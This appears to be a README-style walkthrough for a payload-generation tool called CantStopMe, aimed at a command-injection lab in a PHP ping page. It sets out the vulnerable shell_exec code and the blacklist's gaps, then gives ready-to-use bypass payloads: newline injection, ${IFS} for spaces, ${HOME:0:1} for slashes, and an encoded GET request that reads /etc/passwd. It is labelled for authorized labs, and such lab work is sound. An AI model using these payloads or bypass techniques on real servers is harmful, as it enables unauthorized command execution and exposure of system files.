# PHP ping lab — filter analysis and CantStopMe

**Authorized labs only.** Blacklist: [`php_ping_filter.txt`](php_ping_filter.txt).

## How the server runs your input

```php
$cmd = "bash -c 'ping -c 1 " . $ip . "'";
shell_exec($cmd);
```

Parameter: `GET ip=...`

Bash receives a **multi-line script** when `ip` contains a newline:

```bash
ping -c 1 1.1.1.1
cat /etc/passwd
```

Line 1 = decoy ping; line 2+ = your command. Use **`--ping --url-encode`** so CantStopMe prepends `1.1.1.1%0a`.

## What `filter()` blocks

| Type | Values |
|------|--------|
| Characters | `&` `\|` `;` `\` `/` and **space** |
| Substrings (case-sensitive) | `whoami`, `echo`, `head`, `grep`, `sed`, `awk`, `tail`, `id`, `ip`, ... (full list in `php_ping_filter.txt`) |

**Not blocked (examples):** `$`, newline, tab, `'`, `"`, `` ` ``, `(`, `)`, `%`, `#`, and commands like **`cat`**, **`ls`**, **`tac`**, **`nl`**, **`sort`**, **`base64`**, **`xxd`**, **`od`**, **`printf`**, **`tr`**.

**Watch substring `ip`:** any input containing `ip` fails (e.g. `script`, `tips`). Decoy `1.1.1.1` is safe. **`TCP`** contains `cp` — CantStopMe splits it to `TC${IFS}P`.

### PHP bug (optional manual bypass)

Operators use `if (strpos($str, $operator))` without `!== false`, so a character at **index 0** is not detected. Rarely useful; newline injection is the main path.

## Generate payloads

Use **only** the lab blacklist (do **not** add `--use-pool`; the global pool blocks `$` and breaks `${HOME:0:1}`):

```bash
python cantstopme.py -c "cat /etc/passwd" -b examples/php_ping_filter.txt --ping --url-encode -n 10
```

Example stdout (rank 1):

```text
1.1.1.1%0acat${IFS}${HOME:0:1}etc${HOME:0:1}passwd
```

Paste into Burp/curl as `ip=` (HTTP), not into a local bash prompt.

### HTTP example

```http
GET /ping.php?ip=1.1.1.1%0acat%24%7BIFS%7D%24%7BHOME%3A0%3A1%7Detc%24%7BHOME%3A0%3A1%7Dpasswd HTTP/1.1
```

## Case sensitivity

Word filter is **case-sensitive**. Server may accept `Cat` while CantStopMe models `keyword:cat` in lowercase.

## Command choices

| Blocked | Try instead |
|---------|-------------|
| `head`, `tail`, `sed`, `awk`, `grep` | `cat`, `tac`, `nl`, `sort` |
| space | `${IFS}` (default in ranked output) |
| `/` | `${HOME:0:1}`, brace paths, wildcards (see `-n 10` variants) |
